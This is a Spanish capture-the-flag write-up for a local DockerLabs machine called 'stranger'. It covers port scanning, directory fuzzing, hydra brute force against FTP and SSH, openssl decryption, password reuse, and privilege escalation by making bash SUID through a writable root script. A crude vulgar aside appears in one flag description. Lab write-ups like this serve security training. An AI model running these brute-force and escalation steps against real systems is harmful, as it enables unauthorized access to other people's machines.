#DockerLabs  #WriteUps 

>[!NOTE] Habilidades
> FTP Brute Force, Private Key Decrypt (OpenSSL), Abusing SUID Binary (Privilege Escalation)


## Lanzar el laboratorio

Para desplegar el laboratorio de `docker` que estaremos explotando, ejecutaremos los siguientes comandos

~~~ bash
# Descomprimimos el archivo
unzip stranger.zip

# Asignamos permisos de ejecución al script que despliega el laboratorio
chmod +x auto_deploy.sh

# Lanzamos el laboratorio
./auto_deploy.sh stranger.tar
~~~

Agregaré la dirección IP como `stranger.local` al archivo `/etc/hosts` por comodidad

~~~ bash
echo '127.17.0.2    stranger.local' >> /etc/hosts
~~~


## Ping

Ahora haremos un `ping` a `stranger.local` para validar la comunicación

~~~ bash
ping -c 1 stranger.local
~~~

![Pasted image 20241216224907](https://github.com/user-attachments/assets/019ec254-6120-4b83-a5e4-576b00fe168e)



# Reconocimiento
---
## Nmap 

Empezaremos el reconocimiento con un escaneo básico de puertos abiertos con `nmap` por TCP

~~~ bash
# Escaneo de puertos abiertos
nmap -sS --open -p- --min-rate 5000 -vvv -n Pn stranger.local -oG allPorts
~~~

- `--open`: Mostrar sólo los puertos que están abiertos en la máquina víctima
- `-p-`: Hacer un escaneo de todo el rango de puertos `1-65535`
- `--min-rate 5000`: Tramitar 5000 paquetes por segundo
- `-n`: No aplicar resolución DNS
- **`-sS`: Modo de escaneo TCP SYN, explicaremos más abajo lo que esto significa**
- `-Pn`: No aplicar descubrimiento de host/meterte una pinga por el culo
- `-v`: Mostrar el `output` por la consola en tiempo real
- `-oG`: Exportar el archivo en formato `grep`

![Pasted image 20241216225126](https://github.com/user-attachments/assets/f63ecd01-0dd5-4afb-aa50-89154ebca7d0)

Ahora haremos un segundo escaneo de la versión y servicio que se ejecuta en los puertos que encontramos anteriormente

~~~ bash
# Escaneo de servicios
nmap -sVC -p 21,22,80 stranger.local -oN services
~~~

- `-sV`: Escanear la versión del servicio que se ejecuta
- `-sC`: Escaneo con scripts básicos de reconocimiento
- `-oN`: Exportar en formato normal (tal como se ve por consola)

![Pasted image 20241216225941](https://github.com/user-attachments/assets/9d857fd0-0147-4794-ad1b-da8cad3a9ef2)

Vemos servicios como `ftp`, `ssh` y `http`, si buscamos vulnerabilidades conocidas de acuerdo a la versión de estos servicios no encontraremos gran cosa, veamos el servicio web que ejecuta esta máquina

## Whatweb

Echemos un vistazo a la web, con la herramienta `whatweb` analizaremos las tecnologías que se ejecutan en este servicio web

~~~ bash
whatweb http://stranger.local
~~~

![Pasted image 20241216230934](https://github.com/user-attachments/assets/74b8f62c-7f14-4e57-a204-2db51457926e)

No encontramos gran cosa más que la versión de `apache` y el sistema operativo, que en este caso es Ubuntu

![Pasted image 20241216235750](https://github.com/user-attachments/assets/bf1f5155-834f-4c48-875d-a59217c090a1)

Se le está dando la bienvenida a `mwheeler`, quien puede ser un usuario válido en la máquina víctima

## Fuzzing

Como la página actual no nos brinda más información, lo siguiente que podemos hacer es buscar directorios haciendo `fuzzing`, usaremos la herramienta `wfuzz`. Ejecutemos el siguiente comando

~~~ bash
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://stranger.local/FUZZ
~~~

- `--hc=404`: Ocultar el código de estado 404 (Archivo no encontrado)

![Pasted image 20241217002107](https://github.com/user-attachments/assets/07522a1e-d758-411a-ad3a-680e8bc2bcc8)

Encontramos un directorio `stranger`, accederemos a él para ver su contenido

![Pasted image 20241217002522](https://github.com/user-attachments/assets/d607b568-bce4-4c10-a07f-7f09bc2cd326)

Accedemos a lo que parece ser un blog que aparentemente pertenece a `will`, este puede ser un usuario válido dentro de la máquina, lo consideraremos más tarde. Dado que ningún enlace funciona y no vemos mayor información que pueda ser de utilidad, buscaremos archivos o rutas que puedan existir bajo `http://stranger.local/strange/`


## Encontrando archivos con gobuster

Configuraremos `gobuster` para que buscar archivos de acuerdo con una lista de extensiones que definiremos con el parámetro `-x`, tales como: `php`, `html`, `xml` y `txt`. Usaremos el siguiente comando buscando bajo la ruta `/strange`

~~~ bash
gobuster dir -u http://stranger.local/strange/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x txt,php,xml,html
~~~

![Pasted image 20241218235740](https://github.com/user-attachments/assets/b4cff5fe-3031-4ae0-a3fe-f4a825f09f59)

Vemos una página `secret.html` y un archivo `private.txt`, veamos la página y descarguemos el archivo `private.txt`

~~~ bash
wget http://stranger.local/strange/private.txt
~~~

![Pasted image 20241219002434](https://github.com/user-attachments/assets/dd9dc110-fe3a-44f6-99fc-f00baf33b1e6)

Nos dirigimos a `secret.html` para ver su contenido

![Pasted image 20241218235959](https://github.com/user-attachments/assets/1040ce72-ac15-4405-8c99-aae64cbb4dd2)

Se nos da una pista acerca del acceso por `ftp`, donde el usuario es `admin` y se nos sugiere el diccionario `rockyou.txt` para descubrir la contraseña



# Explotación
---
## FTP Brute force

Haremos fuerza bruta al protocolo `ftp` con la herramienta `hydra` usando el diccionario `rockyou.txt`, para lanzar este ataque especificamos el usuario `admin`

~~~ bash
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt ftp://stranger.local
~~~

- `-l`: Usuario
- `-P`: Listado de palabras o `wordlist`

![Pasted image 20241219000649](https://github.com/user-attachments/assets/48188209-5d7a-4f0f-9573-b365dc2be32c)

Descubrimos la contraseña `banana` para el usuario `admin`, ingresemos por `ftp` a la máquina víctima

~~~ bash
ftp stranger.local
~~~

Si listamos el contenido con `ls`, vemos un archivo que parece ser una clave privada

![Pasted image 20241219001041](https://github.com/user-attachments/assets/a3498cec-bfa7-4646-9cff-5b9b8dba2569)

Descarguemos el archivo en nuestra máquina

~~~ bash
get private_key.pem
~~~

![Pasted image 20241219001242](https://github.com/user-attachments/assets/8e557863-66da-4137-a057-219a37880146)


## Decrypt Private key (OpenSSL)

Con la ayuda de `openssl` podemos desencriptar la clave `private_key.pem` usando el archivo `private.txt`. Almacenaremos el resultado en un archivo, por ejemplo lo llamaré `desencripted.txt`, ejecutemos el siguiente comando

~~~ bash
openssl pkeyutl -decrypt -in private.txt -out desencripted.txt -inkey private_key.pem
~~~

La opción `pkeyutl` realiza operaciones de clave pública de bajo nivel utilizando cualquier algoritmo compatible. En este caso, se usa para desencriptar el mensaje que está en `private.txt`, utilizando el parámetro `-decrypt` en conjunto con la clave privada `private_key.pem`

![Pasted image 20241219002636](https://github.com/user-attachments/assets/fcb3580e-47e8-4ba7-93d8-f8cf22e093fe)

Una vez desencriptamos la clave privada descubrimos la palabra `demogorgon`, guardaremos esta palabra para intentar usarla como la contraseña de algún usuario. Crearemos un archivo con cada usuario potencial para intentar acceder con esta clave con la ayuda de `hydra`

~~~ bash
nano users.txt
~~~

![Pasted image 20241219002536](https://github.com/user-attachments/assets/fed5b4c9-a043-4eee-b01d-3c167a38215c)

Ahora hacemos lo mismo, pero creamos un archivo de las palabras que usaremos como contraseña

~~~ bash
nano passes.txt
~~~

![Pasted image 20241219003231](https://github.com/user-attachments/assets/e0df9033-ded0-4ac7-af63-53dc925a7125)


## Validación de credenciales

Ahora ejecutamos el siguiente comando para intentar acceder con las credenciales que hemos encontrado

~~~ bash
hydra -L users.txt -P passes.txt ssh://stranger.local
~~~

![Pasted image 20241219003357](https://github.com/user-attachments/assets/1e33e3b1-5c70-44cc-9721-668b00ba0343)

Y la contraseña `demogorgon` pertenece al usuario `mwheeler`, ya nos podremos conectar por `ssh`

~~~ bash
ssh mwheeler@stranger.local
~~~

![Pasted image 20241219003517](https://github.com/user-attachments/assets/1209ee67-56a1-4891-be90-ffbc61e85ca5)

Una vez estamos dentro del sistema, haremos un pequeño tratamiento de la TTY sólo para hacer `Ctrl + L` cambiando el valor de la variable de entorno `TERM`

~~~ bash
export TERM=xterm
~~~

![Pasted image 20241219003555](https://github.com/user-attachments/assets/d2636987-27e4-4e5a-950b-4596fea753a4)



# Escalada de privilegios
---
## Privilegios sudo (Posible)

Primeramente, verificamos si tenemos privilegios `sudo` sobre algún archivo o ejecutable, sin embargo, no obtendremos un resultado esperanzador

~~~ bash
sudo -l
~~~

![Pasted image 20241219003736](https://github.com/user-attachments/assets/04168640-d015-45d2-936e-70ba5e18fd42)


## Encontrando archivos SUID (Posible)

Podemos buscar archivos que tengan el bit `SUID` asignado que podamos aprovechar para ejecutar un comando como el propietario del archivo 

~~~ bash
find / -perm /4000 2>/dev/null
~~~

![Pasted image 20241224003350](https://github.com/user-attachments/assets/c9d4bbde-c5cb-4b6b-a401-ab97b53003d7)


## Archivos modificables

Podemos buscar archivos los cuales tengamos capacidad de escritura donde el propietario sea `root`

~~~ bash
find / -type f -writable -user root 2>/dev/null
~~~

![Pasted image 20241219004100](https://github.com/user-attachments/assets/c2b6a9d8-61df-49e7-b2d0-3351cb68e4ec)

Para evitar este output que no nos interesa, podemos hacer uso de un `pipe` con el comando `grep` para ocultar la palabra `proc` en la salida de este comando

~~~ bash
find / -type f -writable -user root 2>/dev/null | grep -v proc
~~~

![Pasted image 20241219004226](https://github.com/user-attachments/assets/e025865d-e0f1-49c3-9407-7419dd1a5905)

Vemos que el archivo `backup.sh` tiene asignado el bit `suid`, podemos intentar aprovecharnos de este archivo para escalar nuestros privilegios

~~~ bash
cat /usr/local/bin/backup.sh
~~~

![Pasted image 20241219004634](https://github.com/user-attachments/assets/f7d94887-2524-4d5b-b0e9-38322007d01f)

Como tenemos capacidad de escritura, podemos modificar el archivo y hacer que ejecute algún comando

~~~ bash
vim /usr/local/bin/backup.sh
~~~

Agregamos la siguiente instrucción al archivo para que asigne el bit `suid` a la `bash`, esto nos permitirá ejecutar `bash` como el propietario, que es `root`

![Pasted image 20241219013559](https://github.com/user-attachments/assets/031a9cff-19f2-4c9d-b1ae-d09a26377d71)

Con la esperanza de que un usuario con privilegios algún día ejecute el script, con una inspección de procesos y tareas `cron`, me de dado cuenta que no. Entonces buscaremos otra forma de escalar privilegios


## Reutilización de credenciales

Veamos los usuarios válidos en esta máquina, ejecutaremos el siguiente comando

~~~ bash
cat /etc/passwd | grep sh | grep -v ssh
~~~

![Pasted image 20241224010223](https://github.com/user-attachments/assets/eab6eca5-bc13-4c52-9ef0-d944e7af1aaf)

Como anteriormente accedimos como `admin` al servicio `ftp`, veamos si se reutiliza la contraseña `banana`

~~~ bash
su admin
~~~

![Pasted image 20241219013202](https://github.com/user-attachments/assets/537542f6-b8c1-44e3-8e0b-6a22c7f8171b)


## Privilegios sudo

Veamos qué podemos ejecutar con `sudo`

![Pasted image 20241219013242](https://github.com/user-attachments/assets/c26f0942-6583-443c-8a23-d8b5272871e3)


## Root time

Dado que no tenemos restricciones, ejecutaremos el script para poder escalar de esa forma ya que usando este usuario solo sería `sudo su` xd

~~~ bash
# Ejecutando el script simulando ser root
sudo /usr/local/bin/backup.sh
~~~

![Pasted image 20241219013823](https://github.com/user-attachments/assets/5684d074-24b5-478c-84c7-a51edcfdac57)

Ahora es como si la tarea mágicamente fue ejecutada, comprobaremos los permisos de la `bash`

~~~ bash
ls -la /bin/bash
~~~

![Pasted image 20241219013853](https://github.com/user-attachments/assets/d6236455-93b9-4acb-8017-3fd240de9f20)

Ahora con el siguiente comando ejecutaremos `bash`, y deberíamos obtener una consola como `root`

~~~ bash
bash -p
~~~

![Pasted image 20241219013939](https://github.com/user-attachments/assets/257ccc62-9640-4dfa-ab9c-526803b45eaa)
